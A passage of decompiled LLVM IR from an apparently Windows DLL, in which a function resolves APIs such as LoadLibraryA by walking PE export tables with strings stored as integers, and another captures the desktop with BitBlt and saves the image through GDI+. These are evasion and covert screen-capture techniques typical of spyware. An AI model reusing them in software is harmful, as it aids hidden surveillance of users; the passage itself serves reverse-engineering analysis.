  store i32 %10, i32* %12, align 4, !insn.addr !545
  %13 = add i32 %arg1, 16, !insn.addr !546
  %14 = inttoptr i32 %13 to i32*, !insn.addr !546
  %15 = load i32, i32* %14, align 4, !insn.addr !546
  %16 = add i32 %0, 16, !insn.addr !547
  %17 = inttoptr i32 %16 to i32*, !insn.addr !547
  store i32 %15, i32* %17, align 4, !insn.addr !547
  store i32 ptrtoint (i32* @global_var_1002d440 to i32), i32* %4, align 4, !insn.addr !548
  ret i32 %0, !insn.addr !549
}

define i32 @function_10001ec0(i32 %arg1) local_unnamed_addr {
dec_label_pc_10001ec0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_4()
  %2 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !550
  %3 = add i32 %0, 4, !insn.addr !551
  %4 = inttoptr i32 %0 to i32*, !insn.addr !552
  store i32 ptrtoint (%vtable_1002d3b4_type* @global_var_1002d3b4 to i32), i32* %4, align 4, !insn.addr !552
  %5 = inttoptr i32 %3 to i64*, !insn.addr !553
  %6 = load i64, i64* %5, align 4, !insn.addr !553
  call void @__asm_movq.38(i64 %6, i128 %2), !insn.addr !553
  %7 = call i32 @___std_exception_copy(), !insn.addr !554
  store i32 ptrtoint (%vtable_1002d434_type* @global_var_1002d434 to i32), i32* %4, align 4, !insn.addr !555
  %8 = add i32 %arg1, 12, !insn.addr !556
  %9 = inttoptr i32 %8 to i32*, !insn.addr !556
  %10 = load i32, i32* %9, align 4, !insn.addr !556
  %11 = add i32 %0, 12, !insn.addr !557
  %12 = inttoptr i32 %11 to i32*, !insn.addr !557
  store i32 %10, i32* %12, align 4, !insn.addr !557
  %13 = add i32 %arg1, 16, !insn.addr !558
  %14 = inttoptr i32 %13 to i32*, !insn.addr !558
  %15 = load i32, i32* %14, align 4, !insn.addr !558
  %16 = add i32 %0, 16, !insn.addr !559
  %17 = inttoptr i32 %16 to i32*, !insn.addr !559
  store i32 %15, i32* %17, align 4, !insn.addr !559
  ret i32 %0, !insn.addr !560
}

define i32 @function_10001f10(i32 %arg1) local_unnamed_addr {
dec_label_pc_10001f10:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !561
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !562
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !563
  store i32 %2, i32* %stack_var_-16, align 4, !insn.addr !564
  %3 = load i32, i32* @global_var_1003e084, align 4, !insn.addr !565
  %4 = xor i32 %3, %1, !insn.addr !566
  store i32 %4, i32* %stack_var_-32, align 4, !insn.addr !567
  %5 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !568
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !569
  %6 = call i32 @"??2@YAPAXI@Z"(i32 12), !insn.addr !570
  %7 = icmp eq i32 %6, 0, !insn.addr !571
  store i32* %stack_var_-32, i32** %esp.0.in.reg2mem, !insn.addr !572
  br i1 %7, label %dec_label_pc_10001f8c, label %dec_label_pc_10001f51, !insn.addr !572

dec_label_pc_10001f51:                            ; preds = %dec_label_pc_10001f10
  %8 = add i32 %6, 4, !insn.addr !573
  %9 = inttoptr i32 %8 to i32*, !insn.addr !573
  store i32 0, i32* %9, align 4, !insn.addr !573
  %10 = add i32 %6, 8, !insn.addr !574
  %11 = inttoptr i32 %10 to i32*, !insn.addr !574
  store i32 1, i32* %11, align 4, !insn.addr !574
  %12 = inttoptr i32 %arg1 to i16*, !insn.addr !575
  %13 = call i16* @SysAllocString(i16* %12), !insn.addr !575
  %14 = ptrtoint i16* %13 to i32, !insn.addr !575
  %15 = inttoptr i32 %6 to i32*, !insn.addr !576
  store i32 %14, i32* %15, align 4, !insn.addr !576
  %16 = icmp eq i16* %13, null, !insn.addr !577
  %17 = icmp eq i1 %16, false, !insn.addr !578
  %18 = icmp eq i32 %14, %arg1, !insn.addr !579
  %or.cond = or i1 %17, %18
  br i1 %or.cond, label %dec_label_pc_10001f7f.thread, label %dec_label_pc_10001f73, !insn.addr !578

dec_label_pc_10001f7f.thread:                     ; preds = %dec_label_pc_10001f51
  %19 = inttoptr i32 %0 to i32*, !insn.addr !580
  store i32 %6, i32* %19, align 4, !insn.addr !580
  br label %dec_label_pc_10001f96

dec_label_pc_10001f73:                            ; preds = %dec_label_pc_10001f51
  store i32 -2147024882, i32* %stack_var_-40, align 4, !insn.addr !581
  %20 = call i32 @function_10011230(i32 -2147024882), !insn.addr !582
  store i32* %stack_var_-40, i32** %esp.0.in.reg2mem, !insn.addr !582
  br label %dec_label_pc_10001f8c, !insn.addr !582

dec_label_pc_10001f8c:                            ; preds = %dec_label_pc_10001f73, %dec_label_pc_10001f10
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %21 = inttoptr i32 %0 to i32*, !insn.addr !580
  store i32 0, i32* %21, align 4, !insn.addr !580
  %22 = add i32 %esp.0, -4, !insn.addr !583
  %23 = inttoptr i32 %22 to i32*, !insn.addr !583
  store i32 -2147024882, i32* %23, align 4, !insn.addr !583
  %24 = call i32 @function_10011230(i32 -1), !insn.addr !584
  br label %dec_label_pc_10001f96, !insn.addr !584

dec_label_pc_10001f96:                            ; preds = %dec_label_pc_10001f7f.thread, %dec_label_pc_10001f8c
  %25 = load i32, i32* %stack_var_-16, align 4, !insn.addr !585
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !586
  ret i32 %0, !insn.addr !587
}

define i32 @function_10001fb0() local_unnamed_addr {
dec_label_pc_10001fb0:
  %eax.1.reg2mem = alloca i32, !insn.addr !588
  %eax.0.reg2mem = alloca i32, !insn.addr !588
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !588
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-20 = alloca i16*, align 4
  %1 = icmp eq i32 %0, 0, !insn.addr !589
  br i1 %1, label %dec_label_pc_10002008, label %dec_label_pc_10001fbe, !insn.addr !590

dec_label_pc_10001fbe:                            ; preds = %dec_label_pc_10001fb0
  %2 = add i32 %0, 8, !insn.addr !591
  %3 = inttoptr i32 %2 to i32*, !insn.addr !591
  %4 = load i32, i32* %3, align 4, !insn.addr !591
  %5 = add i32 %4, -1, !insn.addr !591
  store i32 %5, i32* %3, align 4, !insn.addr !591
  %6 = icmp eq i32 %5, 0, !insn.addr !592
  %7 = icmp eq i1 %6, false, !insn.addr !593
  br i1 %7, label %dec_label_pc_10001fbe.dec_label_pc_10002002_crit_edge, label %dec_label_pc_10001fe0, !insn.addr !593

dec_label_pc_10001fbe.dec_label_pc_10002002_crit_edge: ; preds = %dec_label_pc_10001fbe
  %.pre = inttoptr i32 %0 to i32*, !insn.addr !594
  store i32* %.pre, i32** %.pre-phi.reg2mem
  store i32 %5, i32* %eax.0.reg2mem
  br label %dec_label_pc_10002002

dec_label_pc_10001fe0:                            ; preds = %dec_label_pc_10001fbe
  %8 = inttoptr i32 %0 to i16*, !insn.addr !595
  store i16* %8, i16** %stack_var_-20, align 4, !insn.addr !595
  %9 = ptrtoint i16** %stack_var_-20 to i32, !insn.addr !595
  call void @SysFreeString(i16* %8), !insn.addr !596
  %10 = inttoptr i32 %0 to i32*
  store i32 0, i32* %10, align 4, !insn.addr !597
  %11 = add i32 %0, 4, !insn.addr !598
  %12 = inttoptr i32 %11 to i32*, !insn.addr !598
  %13 = load i32, i32* %12, align 4, !insn.addr !598
  %14 = icmp eq i32 %13, 0, !insn.addr !599
  %.pre3 = add i32 %9, -4
  %.pre5 = inttoptr i32 %.pre3 to i32*
  br i1 %14, label %dec_label_pc_10001ff7, label %dec_label_pc_10001fe7, !insn.addr !600

dec_label_pc_10001fe7:                            ; preds = %dec_label_pc_10001fe0
  store i32 %13, i32* %.pre5, align 4, !insn.addr !601
  %15 = call i32 @function_10011666(), !insn.addr !602
  store i32 0, i32* %12, align 4, !insn.addr !603
  br label %dec_label_pc_10001ff7, !insn.addr !603

dec_label_pc_10001ff7:                            ; preds = %dec_label_pc_10001fe0, %dec_label_pc_10001fe7
  store i32 12, i32* %.pre5, align 4, !insn.addr !604
  %16 = add i32 %9, -8, !insn.addr !605
  %17 = inttoptr i32 %16 to i32*, !insn.addr !605
  call void @"??3@YAXPAXI@Z"(i32* nonnull @4, i32 ptrtoint (i32* @4 to i32)), !insn.addr !606
  store i32* %10, i32** %.pre-phi.reg2mem, !insn.addr !607
  store i32 ptrtoint (i32* @4 to i32), i32* %eax.0.reg2mem, !insn.addr !607
  br label %dec_label_pc_10002002, !insn.addr !607

dec_label_pc_10002002:                            ; preds = %dec_label_pc_10001fbe.dec_label_pc_10002002_crit_edge, %dec_label_pc_10001ff7
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  store i32 0, i32* %.pre-phi.reload, align 4, !insn.addr !594
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !594
  br label %dec_label_pc_10002008, !insn.addr !594

dec_label_pc_10002008:                            ; preds = %dec_label_pc_10002002, %dec_label_pc_10001fb0
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !608
}

define i32 @function_10002010(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10002010:
  %.reg2mem9 = alloca i32, !insn.addr !609
  %ecx.0.reg2mem = alloca i32, !insn.addr !609
  %eax.0.reg2mem = alloca i32, !insn.addr !609
  %.reg2mem7 = alloca i32, !insn.addr !609
  %edi.0.reg2mem = alloca i32, !insn.addr !609
  %esi.0.reg2mem = alloca i32, !insn.addr !609
  %.reg2mem = alloca i32, !insn.addr !609
  %edx = alloca i32, align 8
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-207 = alloca i32, align 4
  %0 = call i32* @_memset(i32* nonnull %stack_var_-207, i32 0, i32 99), !insn.addr !610
  %1 = call i32* @_memset(i32* nonnull %stack_var_-108, i32 0, i32 100), !insn.addr !611
  store i32 1852990827, i32* %stack_var_-208, align 4, !insn.addr !612
  %2 = bitcast i32* %stack_var_-208 to i8*
  %3 = call i32* @GetModuleHandleA(i8* nonnull %2), !insn.addr !613
  %4 = ptrtoint i32* %3 to i32, !insn.addr !613
  store i32 1684107084, i32* %stack_var_-108, align 4, !insn.addr !614
  %5 = add i32 %4, 60, !insn.addr !615
  %6 = inttoptr i32 %5 to i32*, !insn.addr !615
  %7 = load i32, i32* %6, align 4, !insn.addr !615
  %8 = add i32 %4, 120, !insn.addr !616
  %9 = add i32 %8, %7, !insn.addr !616
  %10 = inttoptr i32 %9 to i32*, !insn.addr !616
  %11 = load i32, i32* %10, align 4, !insn.addr !616
  %12 = add i32 %11, %4, !insn.addr !617
  %13 = call i32 @function_1000b5e0(i32 %4, i32* nonnull %stack_var_-108), !insn.addr !618
  %14 = add i32 %12, 36, !insn.addr !619
  %15 = inttoptr i32 %14 to i32*, !insn.addr !619
  %16 = load i32, i32* %15, align 4, !insn.addr !619
  %17 = mul i32 %13, 2, !insn.addr !620
  %18 = add i32 %17, %4, !insn.addr !620
  %19 = add i32 %18, %16, !insn.addr !621
  %20 = inttoptr i32 %19 to i16*, !insn.addr !621
  %21 = load i16, i16* %20, align 2, !insn.addr !621
  %22 = zext i16 %21 to i32, !insn.addr !621
  %23 = add i32 %12, 28, !insn.addr !622
  %24 = inttoptr i32 %23 to i32*, !insn.addr !622
  %25 = load i32, i32* %24, align 4, !insn.addr !622
  %26 = mul i32 %22, 4, !insn.addr !623
  %27 = add i32 %25, %4, !insn.addr !623
  %28 = add i32 %27, %26, !insn.addr !624
  %29 = inttoptr i32 %28 to i32*, !insn.addr !624
  %30 = load i32, i32* %29, align 4, !insn.addr !624
  %31 = add i32 %30, %4, !insn.addr !625
  store i32 %31, i32* @global_var_1003fd9c, align 4, !insn.addr !626
  store i32 1633906508, i32* %stack_var_-108, align 4, !insn.addr !627
  %32 = add i32 %31, 60, !insn.addr !628
  %33 = inttoptr i32 %32 to i32*, !insn.addr !628
  %34 = load i32, i32* %33, align 4, !insn.addr !628
  %35 = add i32 %31, 120, !insn.addr !629
  %36 = add i32 %35, %34, !insn.addr !629
  %37 = inttoptr i32 %36 to i32*, !insn.addr !629
  %38 = load i32, i32* %37, align 4, !insn.addr !629
  %39 = add i32 %31, 24, !insn.addr !630
  %40 = add i32 %39, %38, !insn.addr !631
  %41 = inttoptr i32 %40 to i32*, !insn.addr !631
  %42 = load i32, i32* %41, align 4, !insn.addr !631
  store i32 %42, i32* %edx, align 8, !insn.addr !631
  %43 = call i32 @function_1000b5e0(i32 %31, i32* nonnull %stack_var_-108), !insn.addr !632
  store i32 0, i32* %stack_var_-212, align 4, !insn.addr !633
  store i32 0, i32* %stack_var_-216, align 4, !insn.addr !634
  %44 = call i32 @GdipGetImageEncodersSize(i32* nonnull %stack_var_-212, i32* nonnull %stack_var_-216), !insn.addr !635
  %45 = load i32, i32* %stack_var_-216, align 4, !insn.addr !636
  %46 = icmp eq i32 %45, 0, !insn.addr !637
  %47 = icmp eq i1 %46, false, !insn.addr !638
  br i1 %47, label %dec_label_pc_1000216d, label %dec_label_pc_1000215a, !insn.addr !638

dec_label_pc_1000215a:                            ; preds = %dec_label_pc_10002010
  %48 = call i32 @"@__security_check_cookie@4"(), !insn.addr !639
  ret i32 %48, !insn.addr !640

dec_label_pc_1000216d:                            ; preds = %dec_label_pc_10002010
  %49 = call i32* @LocalAlloc(i32 64, i32 %45), !insn.addr !641
  %50 = icmp eq i32* %49, null, !insn.addr !642
  br i1 %50, label %dec_label_pc_100021e9, label %dec_label_pc_1000217d, !insn.addr !643

dec_label_pc_1000217d:                            ; preds = %dec_label_pc_1000216d
  %51 = load i32, i32* %stack_var_-216, align 4, !insn.addr !644
  %52 = load i32, i32* %stack_var_-212, align 4, !insn.addr !645
  %53 = call i32 @GdipGetImageEncoders(i32 %52, i32 %51, i32* nonnull %49), !insn.addr !646
  %54 = load i32, i32* %stack_var_-212, align 4, !insn.addr !647
  %55 = icmp eq i32 %54, 0, !insn.addr !647
  br i1 %55, label %dec_label_pc_100021e9, label %dec_label_pc_1000219a, !insn.addr !648

dec_label_pc_1000219a:                            ; preds = %dec_label_pc_1000217d
  %56 = ptrtoint i32* %49 to i32, !insn.addr !641
  %57 = add i32 %56, 48, !insn.addr !649
  store i32 %42, i32* %.reg2mem, !insn.addr !650
  store i32 0, i32* %esi.0.reg2mem, !insn.addr !650
  store i32 %57, i32* %edi.0.reg2mem, !insn.addr !650
  br label %dec_label_pc_100021a0, !insn.addr !650

dec_label_pc_100021a0:                            ; preds = %dec_label_pc_100021d6, %dec_label_pc_1000219a
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %58 = inttoptr i32 %edi.0.reload to i32*, !insn.addr !651
  %59 = load i32, i32* %58, align 4, !insn.addr !651
  store i32 %.reload, i32* %.reg2mem7, !insn.addr !652
  store i32 ptrtoint ([11 x i16]* @global_var_1003921c to i32), i32* %eax.0.reg2mem, !insn.addr !652
  store i32 %59, i32* %ecx.0.reg2mem, !insn.addr !652
  br label %dec_label_pc_100021a7, !insn.addr !652

dec_label_pc_100021a7:                            ; preds = %dec_label_pc_100021be, %dec_label_pc_100021a0
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %.reload8 = load i32, i32* %.reg2mem7, !insn.addr !653
  %60 = inttoptr i32 %ecx.0.reload to i16*, !insn.addr !653
  %61 = load i16, i16* %60, align 2, !insn.addr !653
  %62 = zext i16 %61 to i32, !insn.addr !653
  %63 = and i32 %.reload8, -65536, !insn.addr !653
  %64 = or i32 %63, %62, !insn.addr !653
  store i32 %64, i32* %edx, align 8, !insn.addr !653
  %65 = inttoptr i32 %eax.0.reload to i16*, !insn.addr !654
  %66 = load i16, i16* %65, align 4, !insn.addr !654
  %67 = icmp eq i16 %61, %66, !insn.addr !654
  %68 = icmp eq i1 %67, false, !insn.addr !655
  store i32 %64, i32* %.reg2mem9, !insn.addr !655
  br i1 %68, label %dec_label_pc_100021d6, label %dec_label_pc_100021af, !insn.addr !655

dec_label_pc_100021af:                            ; preds = %dec_label_pc_100021a7
  %69 = icmp eq i16 %61, 0, !insn.addr !656
  br i1 %69, label %dec_label_pc_100021fd, label %dec_label_pc_100021b4, !insn.addr !657

dec_label_pc_100021b4:                            ; preds = %dec_label_pc_100021af
  %70 = add i32 %ecx.0.reload, 2, !insn.addr !658
  %71 = inttoptr i32 %70 to i16*, !insn.addr !658
  %72 = load i16, i16* %71, align 2, !insn.addr !658
  %73 = zext i16 %72 to i32, !insn.addr !658
  %74 = or i32 %63, %73, !insn.addr !658
  store i32 %74, i32* %edx, align 8, !insn.addr !658
  %75 = or i32 %eax.0.reload, 2, !insn.addr !659
  %76 = inttoptr i32 %75 to i16*, !insn.addr !659
  %77 = load i16, i16* %76, align 2, !insn.addr !659
  %78 = icmp eq i16 %72, %77, !insn.addr !659
  %79 = icmp eq i1 %78, false, !insn.addr !660
  store i32 %74, i32* %.reg2mem9, !insn.addr !660
  br i1 %79, label %dec_label_pc_100021d6, label %dec_label_pc_100021be, !insn.addr !660

dec_label_pc_100021be:                            ; preds = %dec_label_pc_100021b4
  %80 = add i32 %ecx.0.reload, 4, !insn.addr !661
  %81 = add i32 %eax.0.reload, 4, !insn.addr !662
  %82 = icmp eq i16 %72, 0, !insn.addr !663
  %83 = icmp eq i1 %82, false, !insn.addr !664
  store i32 %74, i32* %.reg2mem7, !insn.addr !664
  store i32 %81, i32* %eax.0.reg2mem, !insn.addr !664
  store i32 %80, i32* %ecx.0.reg2mem, !insn.addr !664
  br i1 %83, label %dec_label_pc_100021a7, label %dec_label_pc_100021fd, !insn.addr !664

dec_label_pc_100021d6:                            ; preds = %dec_label_pc_100021b4, %dec_label_pc_100021a7
  %.reload10 = load i32, i32* %.reg2mem9
  %84 = add nuw i32 %esi.0.reload, 1, !insn.addr !665
  %85 = add i32 %edi.0.reload, 76, !insn.addr !666
  %86 = icmp ult i32 %84, %54, !insn.addr !667
  store i32 %.reload10, i32* %.reg2mem, !insn.addr !668
  store i32 %84, i32* %esi.0.reg2mem, !insn.addr !668
  store i32 %85, i32* %edi.0.reg2mem, !insn.addr !668
  br i1 %86, label %dec_label_pc_100021a0, label %dec_label_pc_100021e9, !insn.addr !668

dec_label_pc_100021e9:                            ; preds = %dec_label_pc_100021d6, %dec_label_pc_1000217d, %dec_label_pc_1000216d
  %87 = call i32 @"@__security_check_cookie@4"(), !insn.addr !669
  ret i32 %87, !insn.addr !670

dec_label_pc_100021fd:                            ; preds = %dec_label_pc_100021af, %dec_label_pc_100021be
  %88 = mul i32 %esi.0.reload, 76, !insn.addr !671
  %89 = add i32 %88, %56, !insn.addr !672
  %90 = inttoptr i32 %89 to i128*, !insn.addr !672
  %91 = load i128, i128* %90, align 4, !insn.addr !672
  %92 = call i128 @__asm_movups.42(i128 %91), !insn.addr !672
  %93 = bitcast i32* %edx to i128*
  %94 = load i128, i128* %93, align 8, !insn.addr !673
  call void @__asm_movups(i128 %94, i128 %92), !insn.addr !673
  %95 = call i32 @"@__security_check_cookie@4"(), !insn.addr !674
  ret i32 %95, !insn.addr !675
}

define i32 @function_10002230() local_unnamed_addr {
dec_label_pc_10002230:
  %esi.0.reg2mem = alloca i32, !insn.addr !676
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !676
  %0 = call i128 @__decompiler_undefined_function_4()
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-312 = alloca i32, align 4
  %stack_var_-556 = alloca i32, align 4
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-332 = alloca i32, align 4
  %3 = call i32 @__decompiler_undefined_function_1()
  %4 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-388 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-372 = alloca i32, align 4
  %stack_var_-219 = alloca i32, align 4
  %stack_var_-392 = alloca i32, align 4
  store i32 20, i32* %stack_var_-372, align 4, !insn.addr !677
  %5 = call i32* @_memset(i32* nonnull %stack_var_-219, i32 0, i32 99), !insn.addr !678
  %6 = call i32* @_memset(i32* nonnull %stack_var_-116, i32 0, i32 100), !insn.addr !679
  store i32 1852990827, i32* %stack_var_-220, align 4, !insn.addr !680
  %7 = bitcast i32* %stack_var_-220 to i8*
  %8 = call i32* @GetModuleHandleA(i8* nonnull %7), !insn.addr !681
  %9 = ptrtoint i32* %8 to i32, !insn.addr !681
  store i32 1684107084, i32* @global_var_10040fc0, align 4, !insn.addr !682
  store i32 1919052108, i32* @global_var_10040fc4, align 4, !insn.addr !683
  store i32 1098478177, i32* @global_var_10040fc8, align 4, !insn.addr !684
  store i8 0, i8* bitcast (i32* @global_var_10040fcc to i8*), align 4, !insn.addr !685
  %10 = add i32 %9, 60, !insn.addr !686
  %11 = inttoptr i32 %10 to i32*, !insn.addr !686
  %12 = load i32, i32* %11, align 4, !insn.addr !686
  %13 = add i32 %9, 120, !insn.addr !687
  %14 = add i32 %13, %12, !insn.addr !687
  %15 = inttoptr i32 %14 to i32*, !insn.addr !687
  %16 = load i32, i32* %15, align 4, !insn.addr !687
  %17 = add i32 %16, %9, !insn.addr !688
  %18 = call i32 @function_1000b5e0(i32 %9, i32* nonnull @global_var_10040fc0), !insn.addr !689
  %19 = add i32 %17, 36, !insn.addr !690
  %20 = inttoptr i32 %19 to i32*, !insn.addr !690
  %21 = load i32, i32* %20, align 4, !insn.addr !690
  %22 = mul i32 %18, 2, !insn.addr !691
  %23 = add i32 %22, %9, !insn.addr !691
  %24 = add i32 %23, %21, !insn.addr !692
  %25 = inttoptr i32 %24 to i16*, !insn.addr !692
  %26 = load i16, i16* %25, align 2, !insn.addr !692
  %27 = zext i16 %26 to i32, !insn.addr !692
  %28 = add i32 %17, 28, !insn.addr !693
  %29 = inttoptr i32 %28 to i32*, !insn.addr !693
  %30 = load i32, i32* %29, align 4, !insn.addr !693
  %31 = mul i32 %27, 4, !insn.addr !694
  %32 = add i32 %30, %9, !insn.addr !694
  %33 = add i32 %32, %31, !insn.addr !695
  %34 = inttoptr i32 %33 to i32*, !insn.addr !695
  %35 = load i32, i32* %34, align 4, !insn.addr !695
  %36 = add i32 %35, %9, !insn.addr !696
  store i32 1919243093, i32* %stack_var_-116, align 4, !insn.addr !697
  store i32 %36, i32* @global_var_1003fd98, align 4, !insn.addr !698
  %37 = call i32 @function_1000b5e0(i32 %36, i32* bitcast ([14 x i8]* @global_var_100391fc to i32*)), !insn.addr !699
  store i32 1885955143, i32* %stack_var_-116, align 4, !insn.addr !700
  %38 = call i32 @function_1000a560(), !insn.addr !701
  store i32 1, i32* %stack_var_-388, align 4, !insn.addr !702
  %39 = call i32 @GdiplusStartup(i32* nonnull %stack_var_-344, i32* nonnull %stack_var_-388, i32* null), !insn.addr !703
  %40 = call i32* @GetDesktopWindow(), !insn.addr !704
  %41 = call i32* @GetWindowDC(i32* %40), !insn.addr !705
  %42 = sub i32 %3, %4, !insn.addr !706
  store i32 %42, i32* %stack_var_-332, align 4, !insn.addr !707
  %43 = call i32 @GetDeviceCaps(i32* %41, i32 12), !insn.addr !708
  %44 = call i32* @CreateCompatibleDC(i32* %41), !insn.addr !709
  %45 = bitcast i32* %stack_var_-392 to i32**
  store i32 40, i32* %stack_var_-280, align 4, !insn.addr !710
  %46 = bitcast i32* %stack_var_-280 to %__MIDL___MIDL_itf_mfobjects_0000_0008_0002*
  %47 = call i32* @CreateDIBSection(i32* %41, %__MIDL___MIDL_itf_mfobjects_0000_0008_0002* nonnull %46, i32 1, i32** nonnull %45, i32* null, i32 0), !insn.addr !711
  %48 = icmp eq i32* %47, null, !insn.addr !712
  %49 = icmp eq i1 %48, false, !insn.addr !713
  br i1 %49, label %dec_label_pc_10002514, label %dec_label_pc_100024ea, !insn.addr !713

dec_label_pc_100024ea:                            ; preds = %dec_label_pc_10002230
  %50 = call i1 @DeleteDC(i32* %44), !insn.addr !714
  %51 = call i1 @DeleteDC(i32* %41), !insn.addr !715
  %52 = call i32 @"@__security_check_cookie@4"(), !insn.addr !716
  ret i32 %52, !insn.addr !717

dec_label_pc_10002514:                            ; preds = %dec_label_pc_10002230
  %53 = ptrtoint i32* %47 to i32, !insn.addr !711
  %54 = sub i32 %2, %1, !insn.addr !718
  %55 = call i32 @SaveDC(i32* %44), !insn.addr !719
  %56 = call i32* @SelectObject(i32* %44, i32* %47), !insn.addr !720
  %57 = call i1 @BitBlt(i32* %44, i32 0, i32 0, i32 %42, i32 %54, i32* %41, i32 0, i32 0, i32 13369376), !insn.addr !721
  %58 = call i1 @RestoreDC(i32* %44, i32 %55), !insn.addr !722
  %59 = call i1 @DeleteDC(i32* %44), !insn.addr !723
  %60 = call i1 @DeleteDC(i32* %41), !insn.addr !724
  store i32 16, i32* %stack_var_-544, align 4, !insn.addr !725
  %61 = call i32* @GdipAlloc(i32 16), !insn.addr !726
  %62 = ptrtoint i32* %61 to i32, !insn.addr !726
  store i32 %62, i32* %stack_var_-332, align 4, !insn.addr !727
  %63 = icmp eq i32* %61, null, !insn.addr !728
  store i32* %stack_var_-544, i32** %esp.0.in.reg2mem, !insn.addr !729
  store i32 0, i32* %esi.0.reg2mem, !insn.addr !729
  br i1 %63, label %dec_label_pc_100025a8, label %dec_label_pc_10002578, !insn.addr !729

dec_label_pc_10002578:                            ; preds = %dec_label_pc_10002514
  store i32 ptrtoint (%vtable_10039cac_type* @global_var_10039cac to i32), i32* %61, align 4, !insn.addr !730
  %64 = bitcast i32* %stack_var_-332 to i32**
  store i32 %53, i32* %stack_var_-556, align 4, !insn.addr !731
  store i32 0, i32* %stack_var_-332, align 4, !insn.addr !732
  %65 = call i32 @GdipCreateBitmapFromHBITMAP(i32* %47, i32* null, i32** nonnull %64), !insn.addr !733
  %66 = add i32 %62, 8, !insn.addr !734
  %67 = inttoptr i32 %66 to i32*, !insn.addr !734
  store i32 %65, i32* %67, align 4, !insn.addr !734
  %68 = load i32, i32* %stack_var_-332, align 4, !insn.addr !735
  %69 = add i32 %62, 4, !insn.addr !736
  %70 = inttoptr i32 %69 to i32*, !insn.addr !736
  store i32 %68, i32* %70, align 4, !insn.addr !736
  store i32* %stack_var_-556, i32** %esp.0.in.reg2mem, !insn.addr !737
  store i32 %62, i32* %esi.0.reg2mem, !insn.addr !737
  br label %dec_label_pc_100025a8, !insn.addr !737

dec_label_pc_100025a8:                            ; preds = %dec_label_pc_10002514, %dec_label_pc_10002578
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %71 = call i128 @__asm_movups.42(i128 492561589), !insn.addr !738
  store i32 1, i32* %stack_var_-312, align 4, !insn.addr !739
  call void @__asm_movups(i128 %0, i128 %71), !insn.addr !740
  %72 = call i32 @function_10002010(i32 4, i32* nonnull %stack_var_-372), !insn.addr !741
  %73 = add i32 %esp.0, -4, !insn.addr !742
  %74 = inttoptr i32 %73 to i32*, !insn.addr !742
  %75 = ptrtoint i32* %stack_var_-312 to i32, !insn.addr !742
  store i32 %75, i32* %74, align 4, !insn.addr !742
  %76 = add i32 %esp.0, -8, !insn.addr !743
  %77 = inttoptr i32 %76 to i32*, !insn.addr !743
  %78 = ptrtoint i32* %stack_var_-328 to i32, !insn.addr !743
  store i32 %78, i32* %77, align 4, !insn.addr !743
  %79 = add i32 %esi.0.reload, 4, !insn.addr !744
  %80 = inttoptr i32 %79 to i32*, !insn.addr !744
  %81 = load i32, i32* %80, align 4, !insn.addr !744
  %82 = add i32 %esp.0, -16, !insn.addr !744
  %83 = inttoptr i32 %82 to i32*, !insn.addr !744
  store i32 %81, i32* %83, align 4, !insn.addr !744
  %84 = call i32 @GdipSaveImageToFile(i32* nonnull @4, i16* bitcast (i32* @4 to i16*), i32* nonnull @4, i32* nonnull @4), !insn.addr !745
  %85 = icmp eq i32 %84, 0, !insn.addr !746
  br i1 %85, label %dec_label_pc_10002615, label %dec_label_pc_1000260e, !insn.addr !747

dec_label_pc_1000260e:                            ; preds = %dec_label_pc_100025a8
  %86 = add i32 %esi.0.reload, 8, !insn.addr !748
  %87 = inttoptr i32 %86 to i32*, !insn.addr !748
  store i32 %84, i32* %87, align 4, !insn.addr !748
  br label %dec_label_pc_10002615, !insn.addr !749

dec_label_pc_10002615:                            ; preds = %dec_label_pc_100025a8, %dec_label_pc_1000260e
  %88 = add i32 %esp.0, -12, !insn.addr !750
  %89 = inttoptr i32 %88 to i32*, !insn.addr !750
  %90 = add i32 %esp.0, -20, !insn.addr !751
  %91 = inttoptr i32 %90 to i32*, !insn.addr !751
  store i32 1, i32* %91, align 4, !insn.addr !751
  %92 = add i32 %esp.0, -24, !insn.addr !752
  %93 = inttoptr i32 %92 to i32*, !insn.addr !752
  store i32 %53, i32* %93, align 4, !insn.addr !752
  %94 = call i1 @DeleteObject(i32* nonnull @4), !insn.addr !753
  %95 = load i32, i32* %stack_var_-344, align 4, !insn.addr !754
